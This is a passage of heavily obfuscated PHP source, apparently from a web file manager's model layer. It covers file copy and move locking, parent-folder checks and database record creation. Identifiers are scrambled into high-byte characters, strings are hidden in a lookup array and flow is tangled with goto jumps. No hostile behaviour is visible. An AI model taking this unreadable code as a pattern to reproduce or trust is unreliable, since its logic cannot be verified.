$_SERVER[¶ªÕß‚ØÁŸ]; $CˆŸŞ©ŠÔÙ = $this->sourceInfo($Eµ¿’‚›…†); $dš®¡„ç¡ = array($A……´ô—‡[490] => array($A……´ô—‡[491], $CˆŸŞ©ŠÔÙ[$A……´ô—‡[467]] . $Eµ¿’‚›…† . $A……´ô—‡[492]), $A……´ô—‡[493] => 0); goto CÀ‚ŠÉ”’‘; F¤Õ•áÚÀÎ: $C¤‚¡‰Ì§÷ = array_to_keyvalue($C¤‚¡‰Ì§÷, $A……´ô—‡[377]); $a¬¡‚ŞÄ–† = "\57{$CˆŸŞ©ŠÔÙ[$A……´ô—‡[28]]}\57"; $a¬¡‚ŞÄ–† = $a¬¡‚ŞÄ–† == $A……´ô—‡[475] ? $A……´ô—‡[8] : $a¬¡‚ŞÄ–†; goto eŠŒÎ«Ğ„ğ; eŠŒÎ«Ğ„ğ: $B¼ôŸ²ë‘¦ = array(); foreach ($C¤‚¡‰Ì§÷ as $d¹–±ùğ‘ß => $eÂªÍ˜ÇÓ•) { goto fé±ª™¹´; Bˆ™‡µº„³: $e‚Àäæ®î« = str_replace($A……´ô—‡[475], $A……´ô—‡[8], $e‚Àäæ®î«); $e‚Àäæ®î« = str_replace($A……´ô—‡[475], $A……´ô—‡[8], $e‚Àäæ®î«); $Bò±©ø×× = array($A……´ô—‡[395] => str_replace($A……´ô—‡[475], $A……´ô—‡[8], $e‚Àäæ®î«), $A……´ô—‡[496] => intval($eÂªÍ˜ÇÓ•[$A……´ô—‡[378]]), $A……´ô—‡[399] => $this->pathInfoFilter($eÂªÍ˜ÇÓ•, !0)); goto EĞ¯íöÔŒŞ; fé±ª™¹´: $b‰ÍŠ½Ô—­ = $this->parentLevelArray($eÂªÍ˜ÇÓ•[$A……´ô—‡[467]]); array_shift($b‰ÍŠ½Ô—­); $e‚Àäæ®î« = $a¬¡‚ŞÄ–†; goto f„‡ŸÒœšã; EĞ¯íöÔŒŞ: if (!$eÂªÍ˜ÇÓ•[$A……´ô—‡[378]]) { $Bò±©ø××[$A……´ô—‡[427]] = $eÂªÍ˜ÇÓ•[$A……´ô—‡[427]]; $Bò±©ø××[$A……´ô—‡[497]] = $eÂªÍ˜ÇÓ•[$A……´ô—‡[85]]; } $B¼ôŸ²ë‘¦[] = $Bò±©ø××; goto C¢È¨Ÿœ›Ò; f„‡ŸÒœšã: for ($AÇàŸ¦› = 0; $AÇàŸ¦› < count($b‰ÍŠ½Ô—­); $AÇàŸ¦›++) { $e‚Àäæ®î« .= $C¤‚¡‰Ì§÷[$b‰ÍŠ½Ô—­[$AÇàŸ¦›]][$A……´ô—‡[28]] . $A……´ô—‡[8]; } $e‚Àäæ®î« .= $eÂªÍ˜ÇÓ•[$A……´ô—‡[28]]; if ($eÂªÍ˜ÇÓ•[$A……´ô—‡[378]]) { $e‚Àäæ®î« .= $A……´ô—‡[8]; } goto Bˆ™‡µº„³; C¢È¨Ÿœ›Ò: } return $B¼ôŸ²ë‘¦; goto bÙÆ»‚×‹¨; c½„À¨À¬‚: $this->_listAppendAuth($C¤‚¡‰Ì§÷); $this->_listAppendUser($C¤‚¡‰Ì§÷); $this->_listAppendPath($C¤‚¡‰Ì§÷); goto F¤Õ•áÚÀÎ; bÙÆ»‚×‹¨: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($f´‚£ƒ£®®) { goto b«†ƒàø‚É; Eä—Ú½¯ŒÛ: $this->_lockEvent($f´‚£ƒ£®®, array($DÛ¤¶ª…«²[501], $DÛ¤¶ª…«²[502]), $C£Ï²¯î¶Ğ); $this->_lockCheckEnd($DÛ¤¶ª…«²[498], $f´‚£ƒ£®®); goto fÄ‹‹ã¸ª; aÜßğ‚Òë: $C£Ï²¯î¶Ğ = 1; $this->_lockEvent($f´‚£ƒ£®®, array($DÛ¤¶ª…«²[499], $DÛ¤¶ª…«²[500]), $C£Ï²¯î¶Ğ); $this->_lockParent($f´‚£ƒ£®®, array($DÛ¤¶ª…«²[500]), $C£Ï²¯î¶Ğ); goto Eä—Ú½¯ŒÛ; b«†ƒàø‚É: $DÛ¤¶ª…«² =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->allowLock()) { return; } $this->_lockCheck($DÛ¤¶ª…«²[498], $f´‚£ƒ£®®); goto aÜßğ‚Òë; fÄ‹‹ã¸ª: } public function lockCopyEnd($e¥«Ç©éÓÆ) { $bñŠóÏó³İ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->allowLock()) { return; } $aœº¶èîŸº = 0; $this->_lockEvent($e¥«Ç©éÓÆ, array($bñŠóÏó³İ[499], $bñŠóÏó³İ[500]), $aœº¶èîŸº); $this->_lockParent($e¥«Ç©éÓÆ, array($bñŠóÏó³İ[500]), $aœº¶èîŸº); $this->_lockEvent($e¥«Ç©éÓÆ, array($bñŠóÏó³İ[501], $bñŠóÏó³İ[502]), $aœº¶èîŸº); } public function lockWriteStart($d°Ëô”ê¢, $AÙ™‚Ó“®² = '') { goto bö…Á´‡ğÕ; bö…Á´‡ğÕ: $dæòÌç­å =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->allowLock()) { return; } $this->_lockCheck($dæòÌç­å[499], $d°Ëô”ê¢); goto Cˆ†ƒ™î¯; b…·ôè‡¤ö: $this->_lockParent($d°Ëô”ê¢, array($dæòÌç­å[498], $dæòÌç­å[500]), $eÎÛÌ’âè¤); $this->_lockCheckEnd($dæòÌç­å[499], $d°Ëô”ê¢); goto B¢«ÁÕñ; Cˆ†ƒ™î¯: $eÎÛÌ’âè¤ = 1; $this->_lockKey($dæòÌç­å[503] . $d°Ëô”ê¢ . $dæòÌç­å[101] . $AÙ™‚Ó“®², $eÎÛÌ’âè¤); $this->_lockEvent($d°Ëô”ê¢, array($dæòÌç­å[498], $dæòÌç­å[500]), $eÎÛÌ’âè¤); goto b…·ôè‡¤ö; B¢«ÁÕñ: } public function lockWriteEnd($dÏëÌ¸‘‹, $c¶Çö‹´ç‘ = '') { $Cİ¥óÉƒÅš =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->allowLock()) { return; } $A×¦¶ØØô© = 0; $this->_lockKey($Cİ¥óÉƒÅš[503] . $dÏëÌ¸‘‹ . $Cİ¥óÉƒÅš[101] . $c¶Çö‹´ç‘, $A×¦¶ØØô©); $this->_lockEvent($dÏëÌ¸‘‹, array($Cİ¥óÉƒÅš[498], $Cİ¥óÉƒÅš[500]), $A×¦¶ØØô©); $this->_lockParent($dÏëÌ¸‘‹, array($Cİ¥óÉƒÅš[498], $Cİ¥óÉƒÅš[500]), $A×¦¶ØØô©); } public function lockMoveStart($dõŞÂ·ìäÄ) { goto BŠöµ”¶; BŠöµ”¶: $Aäé‡ÕìÕŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Aäé‡ÕìÕŒ[500], $dõŞÂ·ìäÄ); goto D±ŠÑİË–¾; CÛôØ–Ù¡©: $this->_lockParent($dõŞÂ·ìäÄ, array($Aäé‡ÕìÕŒ[498], $Aäé‡ÕìÕŒ[500]), $Dƒ«²ß¬éƒ); $this->_lockEvent($dõŞÂ·ìäÄ, array($Aäé‡ÕìÕŒ[505], $Aäé‡ÕìÕŒ[501], $Aäé‡ÕìÕŒ[502]), $Dƒ«²ß¬éƒ); $this->_lockCheckEnd($Aäé‡ÕìÕŒ[500], $dõŞÂ·ìäÄ); goto D¦†â¦ñ¸; D±ŠÑİË–¾: $Dƒ«²ß¬éƒ = 1; $this->_lockKey($Aäé‡ÕìÕŒ[504] . $dõŞÂ·ìäÄ, $Dƒ«²ß¬éƒ); $this->_lockEvent($dõŞÂ·ìäÄ, array($Aäé‡ÕìÕŒ[498], $Aäé‡ÕìÕŒ[499]), $Dƒ«²ß¬éƒ); goto CÛôØ–Ù¡©; D¦†â¦ñ¸: } public function lockMoveEnd($C†ŞÄ¶¾‰) { goto B‰ô‚æ¹¸¥; B‰ô‚æ¹¸¥: $b×´‹êÄ¿Á =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->allowLock()) { return; } $e’ÇˆŸƒ = 0; goto FŠÀ†î§´; D³¿¿Æá: $this->_lockEvent($C†ŞÄ¶¾‰, array($b×´‹êÄ¿Á[505], $b×´‹êÄ¿Á[501], $b×´‹êÄ¿Á[502]), $e’ÇˆŸƒ); goto cô°–†¶›Ù; FŠÀ†î§´: $this->_lockKey($b×´‹êÄ¿Á[504] . $C†ŞÄ¶¾‰, $e’ÇˆŸƒ); $this->_lockEvent($C†ŞÄ¶¾‰, array($b×´‹êÄ¿Á[498], $b×´‹êÄ¿Á[499]), $e’ÇˆŸƒ); $this->_lockParent($C†ŞÄ¶¾‰, array($b×´‹êÄ¿Á[498], $b×´‹êÄ¿Á[500]), $e’ÇˆŸƒ); goto D³¿¿Æá; cô°–†¶›Ù: } private function _lockCheck($E éšæÜ¦´, $fß²ĞèªåÔ) { goto Dí¢ê“İã–; Dí¢ê“İã–: $dè•ôá¨‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cŒäã©Ã…Í = $this->sourceInfo($fß²ĞèªåÔ); $C—ôÑÉà†œ = $E éšæÜ¦´ . $dè•ôá¨‘[101] . $fß²ĞèªåÔ; goto DÍé¯Ş®ŸÆ; eñ‹‹ÙÓ¹–: $eôŒÙ»ªô = array_reverse($this->parentLevelArray($cŒäã©Ã…Í[$dè•ôá¨‘[467]])); foreach ($eôŒÙ»ªô as $Cˆ÷ÍÂ¿ğ) { $C—ôÑÉà†œ = $E éšæÜ¦´ . $dè•ôá¨‘[507] . $Cˆ÷ÍÂ¿ğ; if (CacheLock::lockGet($dè•ôá¨‘[508] . $C—ôÑÉà†œ)) { $cŒäã©Ã…Í = $this->sourceInfo($Cˆ÷ÍÂ¿ğ); CacheLock::setErrorMsg($dè•ôá¨‘[167] . htmlspecialchars($cŒäã©Ã…Í[$dè•ôá¨‘[28]]) . $dè•ôá¨‘[484] . $FÑ‹°®Çñ); $this->_lockKey($C—ôÑÉà†œ, 1); $this->_lockKey($C—ôÑÉà†œ, 0); } } goto fˆ×çÏÉˆÀ; eÏÄäÎ—ƒ: CacheLock::setErrorMsg($dè•ôá¨‘[167] . htmlspecialchars($cŒäã©Ã…Í[$dè•ôá¨‘[28]]) . $dè•ôá¨‘[484] . $FÑ‹°®Çñ); $this->_lockKey($C—ôÑÉà†œ, 1); $this->_lockKey($C—ôÑÉà†œ, 0); goto eñ‹‹ÙÓ¹–; DÍé¯Ş®ŸÆ: $this->_lockTimeStart[$C—ôÑÉà†œ] = timeFloat(); if (!is_array($cŒäã©Ã…Í)) { return; } $FÑ‹°®Çñ = LNG($dè•ôá¨‘[506]); goto eÏÄäÎ—ƒ; fˆ×çÏÉˆÀ: } private function _lockCheckEnd($E‰Æ»İÜÍã, $eà§öÂ½ò‘) { goto d·Îáâ‚¶´; bİÑØ²—å: if (!isset($this->_lockTimeStart[$BÈ¦¹¾Ä¯–])) { return; } $FÚ†‘²º¾‘ = timeFloat() - $this->_lockTimeStart[$BÈ¦¹¾Ä¯–]; unset($this->_lockTimeStart[$BÈ¦¹¾Ä¯–]); goto d½©ë³¹¡; d·Îáâ‚¶´: $c’¦óœ¤İ‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BÈ¦¹¾Ä¯– = $E‰Æ»İÜÍã . $c’¦óœ¤İ‚[101] . $eà§öÂ½ò‘; CacheLock::setErrorMsg($c’¦óœ¤İ‚[66]); goto bİÑØ²—å; d½©ë³¹¡: if ($FÚ†‘²º¾‘ > 0.5) { unset(self::$cacheSourceInfo[$c’¦óœ¤İ‚[418] . $eà§öÂ½ò‘]); } $B¾…¼µ‹êƒ = $this->sourceInfo($eà§öÂ½ò‘); if (!$B¾…¼µ‹êƒ) { show_json(LNG($c’¦óœ¤İ‚[111]), !1); } goto bÃ™«­æÖÓ; bÃ™«­æÖÓ: } private function _lockParent($b¾ŠÓ¼—Ì, $AÀŒ‰ÌË‚¯, $Dš‡ô·Ô“) { if (!$this->autoLockSet) { return; } $D‹‹ˆÉ«³ = $this->sourceInfo($b¾ŠÓ¼—Ì); if (!is_array($D‹‹ˆÉ«³)) { return; } $fĞâÔ÷†ƒˆ = array_reverse($this->parentLevelArray($D‹‹ˆÉ«³[$_SERVER[¶ªÕß‚ØÁŸ][467]])); foreach ($fĞâÔ÷†ƒˆ as $C¹¨…Ë¢È) { $this->_lockEvent($C¹¨…Ë¢È, $AÀŒ‰ÌË‚¯, $Dš‡ô·Ô“); } } private function _lockEvent($aÓËÜáâ‡Ñ, $d·‘ƒ…©ÆŒ, $fùù’˜ÍĞ) { $BøŞñØª¸¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->autoLockSet) { return; } foreach ($d·‘ƒ…©ÆŒ as $b¼Î›ì†Ü) { $f…‚çÌ¤Ü¢ = $b¼Î›ì†Ü . $BøŞñØª¸¦[101] . $aÓËÜáâ‡Ñ; if ($fùù’˜ÍĞ && CacheLock::lockGet($BøŞñØª¸¦[508] . $f…‚çÌ¤Ü¢)) { continue; } $this->_lockKey($f…‚çÌ¤Ü¢, $fùù’˜ÍĞ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($DÛôÇ¤Óò¾, $Cëõ‰½Ÿë = 1) { $e’™¬œÉŒ = $_SERVER[¶ªÕß‚ØÁŸ][508] . md5($DÛôÇ¤Óò¾); if ($Cëõ‰½Ÿë) { if (isset(self::$_lockItemArr[$e’™¬œÉŒ])) { return; } self::$_lockItemArr[$e’™¬œÉŒ] = 1; CacheLock::lock($e’™¬œÉŒ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$e’™¬œÉŒ])) { return; } unset(self::$_lockItemArr[$e’™¬œÉŒ]); CacheLock::unlock($e’™¬œÉŒ); } } public function isParentOf($DŒ„‰´Šğ¾, $FïÊ×Å•Ñ) { goto E²•ˆÕİ‚; EŠÌßÛİ´Ñ: $a®Š²¾÷™‹ = $C¿Ä ˜ìßÏ[$b„Íô˜ĞâÃ[467]] . $C¿Ä ˜ìßÏ[$b„Íô˜ĞâÃ[377]] . $b„Íô˜ĞâÃ[47]; $a†óÅ‡ï® = $eÂã‡ÔÈ„Ô[$b„Íô˜ĞâÃ[467]] . $eÂã‡ÔÈ„Ô[$b„Íô˜ĞâÃ[377]] . $b„Íô˜ĞâÃ[47]; $aùñÏªâë» = strpos($a†óÅ‡ï®, $a®Š²¾÷™‹) === 0; goto Aù¦™¯£³ì; E²•ˆÕİ‚: $b„Íô˜ĞâÃ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C¿Ä ˜ìßÏ = $this->sourceInfo($DŒ„‰´Šğ¾); $eÂã‡ÔÈ„Ô = $this->sourceInfo($FïÊ×Å•Ñ); goto EŠÌßÛİ´Ñ; Aù¦™¯£³ì: return $aùñÏªâë»; goto EëÂÚç–ô¤; EëÂÚç–ô¤: } private $targetIsDelete = 0; public function copy($Dï£¤á«…, $cÍÀƒŞšŒ¸, $cÃïàÒ˜š = REPEAT_REPLACE, $A“òŸç¯ì = '') { goto aİŒˆ®èÛ; aİŒˆ®èÛ: $F÷ç¸¹èŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A”§‘¸»‰ = $this->sourceInfo($Dï£¤á«…); $A–™§ÏÒÁ = $this->sourceInfo($cÍÀƒŞšŒ¸); goto CÀ„ØğŞˆâ; cãÙˆÉ×: if ($A”§‘¸»‰[$F÷ç¸¹èŒ[378]] == $F÷ç¸¹èŒ[93] && $C÷Íø¹Šé == $BÜ…Æ¯éíÚ) { $this->folderSizeResetChildren($C÷Íø¹Šé); } Model($F÷ç¸¹èŒ[512])->addAll($AØò…Óˆ›è[$F÷ç¸¹èŒ[510]], array(), !0); if ($C÷Íø¹Šé != $BÜ…Æ¯éíÚ || $A”§‘¸»‰[$F÷ç¸¹èŒ[378]] == $F÷ç¸¹èŒ[93]) { Model($F÷ç¸¹èŒ[513])->eventCopy($BÜ…Æ¯éíÚ); } goto E©¹á¹òøÔ; CÀ„ØğŞˆâ: if (!$A”§‘¸»‰ || !$A–™§ÏÒÁ || $A–™§ÏÒÁ[$F÷ç¸¹èŒ[378]] != $F÷ç¸¹èŒ[93]) { return !1; } if ($this->isParentOf($Dï£¤á«…, $cÍÀƒŞšŒ¸)) { return !1; } $f£ëÚ”š = $A“òŸç¯ì ? $A“òŸç¯ì : $A”§‘¸»‰[$F÷ç¸¹èŒ[28]]; goto d‹‘—¬··ˆ; B‚ŞÆ÷Œ÷½: $this->_childrenListClear(); $this->lockCopyEnd($Dï£¤á«…); $this->lockWriteEnd($cÍÀƒŞšŒ¸, $f£ëÚ”š); goto cãÙˆÉ×; d‹‘—¬··ˆ: $this->lockCopyStart($Dï£¤á«…); $this->lockWriteStart($cÍÀƒŞšŒ¸, $f£ëÚ”š); $AØò…Óˆ›è = array($F÷ç¸¹èŒ[509] => array(), $F÷ç¸¹èŒ[510] => array(), $F÷ç¸¹èŒ[511] => array()); goto FÅÚ™öŒğ; B× £‹·³Í: $this->updateModifyTime($cÍÀƒŞšŒ¸); return $BÜ…Æ¯éíÚ; goto CË…’‹†ø; FÅÚ™öŒğ: $this->targetIsDelete = intval($A”§‘¸»‰[$F÷ç¸¹èŒ[405]]); $C÷Íø¹Šé = $this->fileNameExistCache($cÍÀƒŞšŒ¸, $A”§‘¸»‰[$F÷ç¸¹èŒ[28]]); $BÜ…Æ¯éíÚ = $this->_copy($Dï£¤á«…, $cÍÀƒŞšŒ¸, $cÃïàÒ˜š, $AØò…Óˆ›è, !0, $A“òŸç¯ì); goto B‚ŞÆ÷Œ÷½; E©¹á¹òøÔ: $this->saveAll($AØò…Óˆ›è[$F÷ç¸¹èŒ[511]]); Model($F÷ç¸¹èŒ[177])->linkAdd($AØò…Óˆ›è[$F÷ç¸¹èŒ[509]]); $this->folderSizeReset($cÍÀƒŞšŒ¸); goto B× £‹·³Í; CË…’‹†ø: } private function _copy($Fœ÷™‚¹¸, $ešÍ¿ã¥Ê—, $a§£³öÄ×, &$a»Š°ø‚Ÿ, $FÄÃ“íÎ‚, $BÎ¸ÛË“È¥ = '') { goto f„±õÕ…ƒ; f„±õÕ…ƒ: $CŞ±½ó³ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dŠòËÀ¾³ = $this->sourceInfoCache($Fœ÷™‚¹¸); $f·Ø…§×æ = $dŠòËÀ¾³[$CŞ±½ó³[378]] == $CŞ±½ó³[93]; goto cù—…çâİ; cù—…çâİ: $A˜ùôåôŞ‰ = $BÎ¸ÛË“È¥ ? $BÎ¸ÛË“È¥ : $dŠòËÀ¾³[$CŞ±½ó³[28]]; $bĞÇÇ†²› = $this->fileNameExistCache($ešÍ¿ã¥Ê—, $A˜ùôåôŞ‰); if ($FÄÃ“íÎ‚) { $this->_childrenAllMake($Fœ÷™‚¹¸); if ($f·Ø…§×æ && $bĞÇÇ†²›) { $this->_childrenAllMake($bĞÇÇ†²›); } } goto AÆ’«Ï¯; c—Ô’Ÿ‹: return $Fˆé–æ‰×æ; goto fÅ‰××¦Àï; AÆ’«Ï¯: if (!$bĞÇÇ†²›) { return $this->_copyCreate($Fœ÷™‚¹¸, $ešÍ¿ã¥Ê—, $A˜ùôåôŞ‰, $a»Š°ø‚Ÿ); } $Fˆé–æ‰×æ = $bĞÇÇ†²›; if ($f·Ø…§×æ) { if ($a§£³öÄ× == REPEAT_RENAME_FOLDER) { $A˜ùôåôŞ‰ = $this->fileNameAutoCache($ešÍ¿ã¥Ê—, $A˜ùôåôŞ‰, $a§£³öÄ×, $f·Ø…§×æ); $Fˆé–æ‰×æ = $this->_copyCreate($Fœ÷™‚¹¸, $ešÍ¿ã¥Ê—, $A˜ùôåôŞ‰, $a»Š°ø‚Ÿ); } else { $aùøàÁÃÀç = $this->_childrenList($Fœ÷™‚¹¸); foreach ($aùøàÁÃÀç as $DÀôÀÅÂ†) { $this->_copy($DÀôÀÅÂ†[$CŞ±½ó³[377]], $bĞÇÇ†²›, $a§£³öÄ×, $a»Š°ø‚Ÿ, !1); } } } else { if ($a§£³öÄ× == REPEAT_RENAME || $a§£³öÄ× == REPEAT_RENAME_FOLDER) { $A˜ùôåôŞ‰ = $this->fileNameAutoCache($ešÍ¿ã¥Ê—, $A˜ùôåôŞ‰, $a§£³öÄ×, $f·Ø…§×æ); $Fˆé–æ‰×æ = $this->_copyCreate($Fœ÷™‚¹¸, $ešÍ¿ã¥Ê—, $A˜ùôåôŞ‰, $a»Š°ø‚Ÿ); } else { if ($a§£³öÄ× == REPEAT_REPLACE) { $EÍ¾´‚ñ­Õ = $this->sourceInfoCache($bĞÇÇ†²›); $FïÈö…‡Û = $this->fileHistory($EÍ¾´‚ñ­Õ, $dŠòËÀ¾³[$CŞ±½ó³[427]], $dŠòËÀ¾³[$CŞ±½ó³[87]]); if ($FïÈö…‡Û) { $a»Š°ø‚Ÿ[$CŞ±½ó³[509]][] = $dŠòËÀ¾³[$CŞ±½ó³[427]]; } } else { if ($a§£³öÄ× == REPEAT_SKIP) { } } } Hook::trigger($CŞ±½ó³[514], array($CŞ±½ó³[515], $dŠòËÀ¾³, 0)); } goto c—Ô’Ÿ‹; fÅ‰××¦Àï: } private function _copyCreate($AÒº¬½Ëà, $cÏùõéÖ, $C¢¬„Ñ‘µš, &$Bœ‘ùªÊ¸‚) { goto DÈíÉšñ—À; DÈíÉšñ—À: $a–ğ£Š½­Â =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÛè„„ë­ = $this->sourceInfoCache($AÒº¬½Ëà); $A‡ÖŒ—Ù¦ = $this->sourceInfoCache($cÏùõéÖ); goto EŒ¨´·´¬”; f†ÇİÍ©˜ : $this->chunkEventSet($a–ğ£Š½­Â[523], array($a–ğ£Š½­Â[524], $bñÎÒ”îíŒ, $Dì›ñÕé©¯)); $this->saveAll($d¢¦ê÷ Ÿç); return $c®È‰˜ˆêê; goto DìĞ‰‘‡¨¡; càÈÙ¥Ö»«: $d¶‘ëˆ«Ì‘[$AÒº¬½Ëà] = $c®È‰˜ˆêê; $F×“ÄÛ§²Æ = array(); $d¢¦ê÷ Ÿç = array(); goto Aíù¥ó„›©; e„ÑõÕ”¡: $this->_childrenListAll($AÒº¬½Ëà, $dæ…Ñ¶İ); $Dì›ñÕé©¯ = count($dæ…Ñ¶İ); if ($Dì›ñÕé©¯ == 0) { return $c®È‰˜ˆêê; } goto e”è†²•æ¦; Aíù¥ó„›©: foreach ($e­ĞÜçß„ as $CÒïíµ®ß‡) { $E¯“Ç®Ô‹Ô = $CÒïíµ®ß‡[$a–ğ£Š½­Â[377]]; $A¢…±Ä™× = $this->_childrenMatch($d¶‘ëˆ«Ì‘, $CÒïíµ®ß‡, $b‹¨Õ®‰Ş¢); $F×“ÄÛ§²Æ[] = array($a–ğ£Š½­Â[377], $E¯“Ç®Ô‹Ô, $a–ğ£Š½­Â[469], $A¢…±Ä™×[$a–ğ£Š½­Â[469]]); $d¢¦ê÷ Ÿç[] = array($a–ğ£Š½­Â[377], $E¯“Ç®Ô‹Ô, $a–ğ£Š½­Â[467], $A¢…±Ä™×[$a–ğ£Š½­Â[467]]); $this->_copyApplyMeta($CÒïíµ®ß‡, $Bœ‘ùªÊ¸‚); if ($CÒïíµ®ß‡[$a–ğ£Š½­Â[378]] != $a–ğ£Š½­Â[93]) { $Bœ‘ùªÊ¸‚[$a–ğ£Š½­Â[509]][] = $CÒïíµ®ß‡[$a–ğ£Š½­Â[427]]; } } $this->chunkEventSet($a–ğ£Š½­Â[521], array($a–ğ£Š½­Â[522], $bñÎÒ”îíŒ, $Dì›ñÕé©¯)); $this->saveAll($F×“ÄÛ§²Æ); goto f†ÇİÍ©˜ ; AŒ¿ïÜäÏ: $this->addAll($B˜Å¦¿Ç´¸, array(), !1); $e­ĞÜçß„ = $this->where(array($a–ğ£Š½­Â[469] => $c®È‰˜ˆêê))->select(); $d¶‘ëˆ«Ì‘ = $this->_childrenMakeRelation($dæ…Ñ¶İ, $e­ĞÜçß„); goto càÈÙ¥Ö»«; EŒ¨´·´¬”: $bñÎÒ”îíŒ = $this->_makeItemData($eÛè„„ë­, $A‡ÖŒ—Ù¦, $C¢¬„Ñ‘µš); Hook::trigger($a–ğ£Š½­Â[516], $bñÎÒ”îíŒ); Hook::trigger($a–ğ£Š½­Â[517], array($a–ğ£Š½­Â[518], $bñÎÒ”îíŒ, 0)); goto Dô©±å§æõ; e”è†²•æ¦: $b‹¨Õ®‰Ş¢ = $this->sourceInfo($c®È‰˜ˆêê); foreach ($dæ…Ñ¶İ as $CÒïíµ®ß‡) { $EƒÛç¬É¾ö = $this->_makeItemData($CÒïíµ®ß‡, $b‹¨Õ®‰Ş¢, $CÒïíµ®ß‡[$a–ğ£Š½­Â[28]]); $EƒÛç¬É¾ö[$a–ğ£Š½­Â[467]] = $CÒïíµ®ß‡[$a–ğ£Š½­Â[467]]; $B˜Å¦¿Ç´¸[] = $EƒÛç¬É¾ö; } $this->chunkEventSet($a–ğ£Š½­Â[519], array($a–ğ£Š½­Â[520], $bñÎÒ”îíŒ, $Dì›ñÕé©¯)); goto AŒ¿ïÜäÏ; Dô©±å§æõ: $c®È‰˜ˆêê = $this->add($bñÎÒ”îíŒ); $D’™á½ƒ‘ê = array($a–ğ£Š½­Â[377] => $c®È‰˜ˆêê, $a–ğ£Š½­Â[28] => $C¢¬„Ñ‘µš); $this->_copyApplyMeta($D’™á½ƒ‘ê, $Bœ‘ùªÊ¸‚); goto c™¡¬ë®ç›; c™¡¬ë®ç›: if ($eÛè„„ë­[$a–ğ£Š½­Â[378]] != $a–ğ£Š½­Â[93]) { $Bœ‘ùªÊ¸‚[$a–ğ£Š½­Â[509]][] = $eÛè„„ë­[$a–ğ£Š½­Â[427]]; return $c®È‰˜ˆêê; } $dæ…Ñ¶İ = array(); $B˜Å¦¿Ç´¸ = array(); goto e„ÑõÕ”¡; DìĞ‰‘‡¨¡: } private function _childrenMakeRelation($aš¸‡–¨‘Ã, $CÉæù‡ù¹÷) { $aËç‡·õÕ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d»¿±„ÀÇ± = array(); $AœÉÁ÷ÀË = array(); foreach ($aš¸‡–¨‘Ã as $C©‹³ä°Ïã) { $b«åˆî·°¿ = $C©‹³ä°Ïã[$aËç‡·õÕ[28]] . $aËç‡·õÕ[8] . $C©‹³ä°Ïã[$aËç‡·õÕ[467]]; $d»¿±„ÀÇ±[$b«åˆî·°¿] = $C©‹³ä°Ïã[$aËç‡·õÕ[377]]; } foreach ($CÉæù‡ù¹÷ as $C©‹³ä°Ïã) { $b«åˆî·°¿ = $C©‹³ä°Ïã[$aËç‡·õÕ[28]] . $aËç‡·õÕ[8] . $C©‹³ä°Ïã[$aËç‡·õÕ[467]]; $D¸«¨òö½ = $d»¿±„ÀÇ±[$b«åˆî·°¿]; $AœÉÁ÷ÀË[$D¸«¨òö½] = $C©‹³ä°Ïã[$aËç‡·õÕ[377]]; } return $AœÉÁ÷ÀË; } private function _childrenMatch($C˜‹ºœÏ—À, $eÔ«˜»’ƒ, $BÏ´Ş¯õÚù) { goto cÎÙ¯ŒêÅš; FÇÒÃ„×è: $aİ¡ˆŒ¾‚ = $F™²„šê¾‰[count($F™²„šê¾‰) - 1]; return array($FòÛø¤¯øÜ[469] => $aİ¡ˆŒ¾‚, $FòÛø¤¯øÜ[467] => $DŞ“İğ£); goto bËÛª…«…ç; B‚šéóÂÌí: foreach ($d‹¬×«ÁéŸ as $böËŒÖëÊ) { if (isset($C˜‹ºœÏ—À[$böËŒÖëÊ])) { $DŞ“İğ£ .= $C˜‹ºœÏ—À[$böËŒÖëÊ] . $FòÛø¤¯øÜ[525]; } } $DŞ“İğ£ = rtrim($DŞ“İğ£, $FòÛø¤¯øÜ[47]) . $FòÛø¤¯øÜ[47]; $F™²„šê¾‰ = $this->parentLevelArray($DŞ“İğ£); goto FÇÒÃ„×è; cÎÙ¯ŒêÅš: $FòÛø¤¯øÜ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DŞ“İğ£ = $BÏ´Ş¯õÚù[$FòÛø¤¯øÜ[467]]; $d‹¬×«ÁéŸ = $this->parentLevelArray($eÔ«˜»’ƒ[$FòÛø¤¯øÜ[467]]); goto B‚šéóÂÌí; bËÛª…«…ç: } private function _makeItemData($cñ–¦ ²öÛ, $F…Ì¹çñõ‰, $c£»ëÀ³§ä) { $d¼Ô×ºÙÕ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B‘»’ï¶Å× = array($d¼Ô×ºÙÕ[526] => $cñ–¦ ²öÛ[$d¼Ô×ºÙÕ[378]], $d¼Ô×ºÙÕ[394] => $c£»ëÀ³§ä, $d¼Ô×ºÙÕ[527] => $cñ–¦ ²öÛ[$d¼Ô×ºÙÕ[380]], $d¼Ô×ºÙÕ[428] => $cñ–¦ ²öÛ[$d¼Ô×ºÙÕ[427]], $d¼Ô×ºÙÕ[528] => $cñ–¦ ²öÛ[$d¼Ô×ºÙÕ[87]], $d¼Ô×ºÙÕ[529] => $F…Ì¹çñõ‰[$d¼Ô×ºÙÕ[379]], $d¼Ô×ºÙÕ[530] => $F…Ì¹çñõ‰[$d¼Ô×ºÙÕ[464]], $d¼Ô×ºÙÕ[531] => USER_ID, $d¼Ô×ºÙÕ[532] => USER_ID, $d¼Ô×ºÙÕ[376] => $F…Ì¹çñõ‰[$d¼Ô×ºÙÕ[377]], $d¼Ô×ºÙÕ[533] => $F…Ì¹çñõ‰[$d¼Ô×ºÙÕ[467]] . $F…Ì¹çñõ‰[$d¼Ô×ºÙÕ[377]] . $d¼Ô×ºÙÕ[47], 